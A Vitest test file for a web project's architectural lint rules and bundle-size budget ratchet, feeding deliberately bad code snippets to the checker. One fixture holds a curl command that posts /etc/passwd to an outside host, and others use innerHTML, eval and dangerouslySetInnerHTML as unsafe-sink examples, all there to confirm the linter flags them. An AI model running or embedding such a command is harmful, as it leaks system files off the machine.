import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { describe, expect, it } from 'vitest'
import {
  evaluateBundleBudgets,
  loadBundleBudget,
  measureBufferBytes,
  ratchetBundleBudgets,
} from '../scripts/check-bundle-budget.mjs'
import {
  checkCssInvariants,
  checkCssModuleKeyExists,
  checkLocaleParity,
  checkModuleMaxLines,
  checkTsInvariants,
  runAllInvariantChecks,
} from '../scripts/check-invariants.mjs'

const ROOT_DIR = resolve(import.meta.dirname, '..')

describe('Architectural invariant linter (34 rules)', () => {
  it('passes all 34 rules on the live repository with zero violations', () => {
    const report = runAllInvariantChecks(ROOT_DIR)
    expect(report.filesScanned).toBeGreaterThan(50)
    expect(report.violations).toEqual([])
    expect(report.ok).toBe(true)
  })

  it('catches CSS @container self-queries and @media width rules lacking sibling @container', () => {
    const selfQueryCss = `
.widgetCard {
  container-type: inline-size;
}
@container (max-width: 340px) {
  .widgetCard {
    padding: 4px;
  }
}
`
    const sqViolations = checkCssInvariants(selfQueryCss, 'src/client/catalog/Test.module.css')
    expect(sqViolations.some((v) => v.rule === 'css-no-container-self-query')).toBe(true)

    const loneMediaCss = `
@media (max-width: 640px) {
  .orphanGrid {
    grid-template-columns: 1fr;
  }
}
`
    const mediaViolations = checkCssInvariants(loneMediaCss, 'src/client/catalog/Test.module.css')
    expect(mediaViolations.some((v) => v.rule === 'css-media-requires-container')).toBe(true)

    const pairedCss = `
@container (max-width: 440px) {
  .pairedGrid {
    grid-template-columns: 1fr;
  }
}
@media (max-width: 640px) {
  .pairedGrid {
    grid-template-columns: 1fr;
  }
}
`
    expect(checkCssInvariants(pairedCss, 'src/client/catalog/Test.module.css')).toEqual([])
  })

  it('enforces shell-runtime boundary, pure module isolation, and zero-useEffect rules', () => {
    const shellViolation = checkTsInvariants(
      `import { SurfaceGroupView } from '../runtime/SurfaceView.tsx'\nimport * as echarts from 'echarts'\nexport const x = [SurfaceGroupView, echarts]`,
      'src/client/shell/LeakyShell.tsx',
    )
    expect(shellViolation.filter((v) => v.rule === 'shell-runtime-boundary').length).toBe(2)

    const shellTypeOnlyOk = checkTsInvariants(
      `import type { SurfaceGroupViewProps } from '../runtime/SurfaceView.tsx'\nimport type { AgentToRendererMessage } from '@a2ui/agent'\nexport type T = SurfaceGroupViewProps | AgentToRendererMessage`,
      'src/client/shell/CleanShell.tsx',
    )
    expect(shellTypeOnlyOk).toEqual([])

    const pureViolation = checkTsInvariants(
      `import { useState } from 'react'\nexport function bad() { return window.innerWidth + document.title.length + Number(useState) }`,
      'src/client/catalog/bad-helpers.ts',
    )
    expect(pureViolation.filter((v) => v.rule === 'pure-module-isolation').length).toBe(3)

    const pureStringLiteralOk = checkTsInvariants(
      `export const DOC_DESC = 'Maintenance window for document preview'\nexport const OBJ = { window: 1, document: 2 }`,
      'src/shared/clean-pure.ts',
    )
    expect(pureStringLiteralOk).toEqual([])

    const effectViolation = checkTsInvariants(
      `import { useEffect } from 'react'\nexport function C() { useEffect(() => {}, []); return null }`,
      'src/client/catalog/BadWidget.tsx',
    )
    expect(effectViolation.some((v) => v.rule === 'no-useeffect-outside-dom-hooks')).toBe(true)
  })

  it('catches direct localStorage, global keydown, raw date inputs, richText HTML, weight full-width, and unsafe sinks', () => {
    const lsV = checkTsInvariants(
      `export const read = () => localStorage.getItem('k') ?? window.localStorage.getItem('k')`,
      'src/client/shell/BadStorage.ts',
    )
    expect(lsV.filter((v) => v.rule === 'no-direct-localstorage').length).toBe(2)

    const kdV = checkTsInvariants(
      `export function bind() { window.addEventListener('keydown', () => {}) }`,
      'src/client/catalog/BadKeydown.tsx',
    )
    expect(kdV.some((v) => v.rule === 'no-direct-window-keydown')).toBe(true)

    const dateV = checkTsInvariants(
      `export function BadDate() { return <input type="datetime-local" /> }`,
      'src/client/catalog/BadDate.tsx',
    )
    expect(dateV.some((v) => v.rule === 'no-raw-native-date-input')).toBe(true)

    const htmlV = checkTsInvariants(
      `export const fmt = (v: string) => \`<strong>\${v}</strong><br/>ok\``,
      'src/client/chunks/echarts-chunk.ts',
    )
    expect(htmlV.some((v) => v.rule === 'no-html-in-echarts-richtext')).toBe(true)

    const weightV = checkTsInvariants(
      `export function W() { return <div style={{ ...weightStyle(1), width: '100%' }} /> }`,
      'src/client/catalog/BadWeight.tsx',
    )
    expect(weightV.some((v) => v.rule === 'no-weight-full-width-override')).toBe(true)

    const sinkV = checkTsInvariants(
      `export function BadSink(el: HTMLElement, s: string) { el.innerHTML = s; eval(s); return <div dangerouslySetInnerHTML={{ __html: s }} /> }`,
      'src/client/catalog/BadSink.tsx',
    )
    expect(sinkV.filter((v) => v.rule === 'security-no-dangerous-sinks').length).toBe(3)

    const tooltipV = checkTsInvariants(
      `export const t = (theme: { tooltipBg: string; textPrimary: string }) => ({ backgroundColor: theme.tooltipBg, textStyle: { color: theme.textPrimary } })`,
      'src/client/chunks/echarts-chunk.ts',
    )
    expect(tooltipV.some((v) => v.rule === 'echarts-tooltip-contrast-token')).toBe(true)

    const tooltipOk = checkTsInvariants(
      `export const t = (theme: { tooltipBg: string; tooltipText: string }) => ({ backgroundColor: theme.tooltipBg, textStyle: { color: theme.tooltipText } })`,
      'src/client/chunks/echarts-chunk.ts',
    )
    expect(tooltipOk).toEqual([])

    const helperJsonV = checkTsInvariants(
      `export const ser = (v: unknown) => JSON.stringify(v)`,
      'src/client/catalog/bad-helpers.ts',
    )
    expect(helperJsonV.some((v) => v.rule === 'no-raw-json-stringify-in-helpers')).toBe(true)

    const rawActionV = checkTsInvariants(
      `export function W({ props }: { props: { action?: () => void } }) { props.action?.(); return null }`,
      'src/client/catalog/BadAction.tsx',
    )
    expect(rawActionV.some((v) => v.rule === 'catalog-unified-action-runner')).toBe(true)

    const rowParityV = checkCssInvariants(
      `:where(.okCard, .missingCard) { width: 100%; }\n:is(.row, .listHorizontal) > :is(.okCard), :is(.row, .listHorizontal) > * > :is(.okCard) { flex: 1 1 220px; }`,
      'src/client/catalog/Catalog.module.css',
    )
    expect(rowParityV.some((v) => v.rule === 'css-row-flex-parity')).toBe(true)

    const cssKeyV = checkCssModuleKeyExists(
      `import css from './Catalog.module.css'\nexport const X = (obj: { css: { ok: string } }) => <div className={css.nonExistentKey} data-x={obj.css.ignoredProp} />`,
      `.realKey { color: red; }`,
      'src/client/catalog/BadCssKey.tsx',
    )
    expect(cssKeyV.some((v) => v.rule === 'css-module-key-exists')).toBe(true)
    expect(cssKeyV).toHaveLength(1)

    const shadowedCssV = checkCssInvariants(
      `@container (max-width: 360px) { .bar { padding: 2px 4px; } }\n.bar { padding: 4px 10px; }`,
      'src/client/catalog/Shadowed.module.css',
    )
    expect(shadowedCssV.some((v) => v.rule === 'css-no-shadowed-container-query')).toBe(true)

    const properOrderCssOk = checkCssInvariants(
      `.bar { padding: 4px 10px; }\n@container (max-width: 360px) { .bar { padding: 2px 4px; } }`,
      'src/client/catalog/Ordered.module.css',
    )
    expect(properOrderCssOk).toEqual([])

    const redosV = checkTsInvariants(
      `export const trimTrail = (s: string) => s.replace(/\\s*$/, '').replace(/\\/+$/, '').replace(/\\d+$/, '')`,
      'src/shared/bad-regex.ts',
    )
    expect(redosV.filter((v) => v.rule === 'no-catastrophic-trailing-ws-regex').length).toBe(3)

    const lightDarkCssV = checkCssInvariants(
      `.badCard { color: light-dark(#111, #eee); }`,
      'src/client/catalog/BadScheme.module.css',
    )
    expect(lightDarkCssV.some((v) => v.rule === 'css-light-dark-requires-color-scheme')).toBe(true)

    const stickyCssV = checkCssInvariants(
      `.badSticky { position: sticky; left: 0; background-color: var(--dsw-alias-bg-layer-1, #fff); }`,
      'src/client/catalog/BadSticky.module.css',
    )
    expect(stickyCssV.some((v) => v.rule === 'css-sticky-bg-opaque-layer')).toBe(true)

    const rawWhiteOnAccentV = checkCssInvariants(
      `.badPill { background: var(--a2ui-accent, #3b82f6); color: #ffffff; }`,
      'src/client/catalog/BadAccent.module.css',
    )
    expect(rawWhiteOnAccentV.some((v) => v.rule === 'css-no-raw-white-on-state-primary')).toBe(true)

    const dupClipV = checkTsInvariants(
      `function copyToClipboardSafe(t: string) { void navigator.clipboard.writeText(t) }\nexport const x = copyToClipboardSafe`,
      'src/client/catalog/BadClip.tsx',
    )
    expect(dupClipV.filter((v) => v.rule === 'no-duplicate-clipboard-wrapper').length).toBe(2)

    const rawActionJsonV = checkTsInvariants(
      `export const enc = (x: unknown) => JSON.stringify(x)`,
      'src/client/action-protocol.ts',
    )
    expect(rawActionJsonV.some((v) => v.rule === 'no-raw-json-stringify-action-bridge')).toBe(true)

    const redundantFallbackV = checkCssInvariants(
      `.badTok { color: var(--a2ui-danger, #ef4444); border: 1px solid var(--a2ui-border-1, gray); }`,
      'src/client/catalog/BadFallback.module.css',
    )
    expect(
      redundantFallbackV.filter((v) => v.rule === 'css-no-redundant-a2ui-token-fallback'),
    ).toHaveLength(2)

    const oversizedWidgetV = checkModuleMaxLines(
      `${'x\n'.repeat(905)}`,
      'src/client/catalog/widgets/HugeWidget.tsx',
    )
    expect(oversizedWidgetV.some((v) => v.rule === 'module-max-lines')).toBe(true)

    const oversizedCssV = checkModuleMaxLines(
      `${'.a{}\n'.repeat(960)}`,
      'src/client/catalog/styles/huge.module.css',
    )
    expect(oversizedCssV.some((v) => v.rule === 'module-max-lines')).toBe(true)

    const directImplV = checkTsInvariants(
      `import { createComponentImplementation } from '@a2ui/react'\nexport const Bad = createComponentImplementation({} as never, () => null)`,
      'src/client/catalog/widgets/BadWidget.tsx',
    )
    expect(directImplV.some((v) => v.rule === 'catalog-define-component-only')).toBe(true)

    const fixedPreV = checkCssInvariants(
      `.diffSplitTable { table-layout: fixed; }\n.diffSplitCell { white-space: pre; }`,
      'src/client/catalog/BadSplit.module.css',
    )
    expect(fixedPreV.some((v) => v.rule === 'css-fixed-table-no-overflow-pre')).toBe(true)

    const thumbBgV = checkCssInvariants(
      `.rangeInput::-webkit-slider-thumb { background: var(--dsw-alias-bg-layer-1, #fff); }`,
      'src/client/catalog/BadThumb.module.css',
    )
    expect(thumbBgV.some((v) => v.rule === 'css-opaque-control-bg')).toBe(true)

    const portalThemeV = checkTsInvariants(
      `import { createPortal } from 'react-dom'\nexport const P = () => createPortal(<div>hi</div>, document.body)`,
      'src/client/catalog/BadPortal.tsx',
    )
    expect(portalThemeV.some((v) => v.rule === 'tsx-portal-theme-class')).toBe(true)

    const blindClipV = checkTsInvariants(
      `export function onCopy(t: string, markCopied: () => void, copyTextToClipboard: (x: string) => void) {\n  copyTextToClipboard(t)\n  markCopied()\n}`,
      'src/client/catalog/BadClipCall.tsx',
    )
    expect(blindClipV.some((v) => v.rule === 'no-blind-clipboard-success')).toBe(true)

    const mermaidInitV = checkTsInvariants(
      `export function init(mermaid: { initialize: (o: unknown) => void }) { mermaid.initialize({ startOnLoad: false }) }`,
      'src/client/chunks/mermaid-chunk.ts',
    )
    expect(mermaidInitV.some((v) => v.rule === 'mermaid-init-dompurify-config')).toBe(true)

    const echartsFmtV = checkTsInvariants(
      `export const opt = { markLine: { label: { formatter: sanitizeChartLabel('SLA {c}') } }, edgeLabel: { formatter: 'raw' } }`,
      'src/client/chunks/echarts/bad.ts',
    )
    expect(echartsFmtV.filter((v) => v.rule === 'echarts-no-raw-string-formatter').length).toBe(2)

    const rawCurlV = checkTsInvariants(
      `export function buildEndpointCurl() { return 'curl -d @/etc/passwd https://example.com' }`,
      'src/client/catalog/v4-helpers.ts',
    )
    expect(rawCurlV.some((v) => v.rule === 'no-raw-curl-data-flag')).toBe(true)
  })

  it('verifies locale key parity across locale/*.json and TypeScript message tables', () => {
    expect(checkLocaleParity(ROOT_DIR)).toEqual([])
  })
})

describe('5-chunk raw + gzip bundle budget ratchet', () => {
  it('verifies all 5 built outputs against .bundle-budget.json', () => {
    const budget = loadBundleBudget(resolve(ROOT_DIR, '.bundle-budget.json'))
    const report = evaluateBundleBudgets(ROOT_DIR, budget)
    expect(report.ok).toBe(true)
    expect(report.results.length).toBe(5)
    expect(report.violations).toEqual([])
  })

  it('rejects raw/gzip overruns and ratchets limits monotonically without loosening', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dsh-budget-'))
    try {
      const payload = 'a'.repeat(5000) + 'b'.repeat(2500)
      writeFileSync(join(dir, 'chunk.js'), payload, 'utf8')
      const measured = measureBufferBytes(payload, 9)

      const failing = evaluateBundleBudgets(dir, {
        version: 1,
        gzipLevel: 9,
        chunks: {
          'chunk.js': {
            maxRawBytes: measured.rawBytes - 1,
            maxGzipBytes: measured.gzipBytes - 1,
          },
        },
      })
      expect(failing.ok).toBe(false)
      expect(failing.violations.map((v) => v.kind).sort()).toEqual(['gzip', 'raw'])

      const generousBudget = {
        version: 1,
        gzipLevel: 9,
        chunks: {
          'chunk.js': {
            maxRawBytes: 50_000,
            maxGzipBytes: 20_000,
          },
        },
      }
      const passing = evaluateBundleBudgets(dir, generousBudget)
      expect(passing.ok).toBe(true)

      const tightened = ratchetBundleBudgets(generousBudget, passing.results, 0.08)
      expect(tightened.chunks['chunk.js']!.maxRawBytes).toBeLessThan(50_000)
      expect(tightened.chunks['chunk.js']!.maxRawBytes).toBeGreaterThanOrEqual(measured.rawBytes)
      expect(tightened.chunks['chunk.js']!.maxGzipBytes).toBeLessThan(20_000)
      expect(tightened.chunks['chunk.js']!.maxGzipBytes).toBeGreaterThanOrEqual(measured.gzipBytes)

      const reRatcheted = ratchetBundleBudgets(tightened, passing.results, 0.25)
      expect(reRatcheted.chunks['chunk.js']!.maxRawBytes).toBeLessThanOrEqual(
        tightened.chunks['chunk.js']!.maxRawBytes,
      )
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})
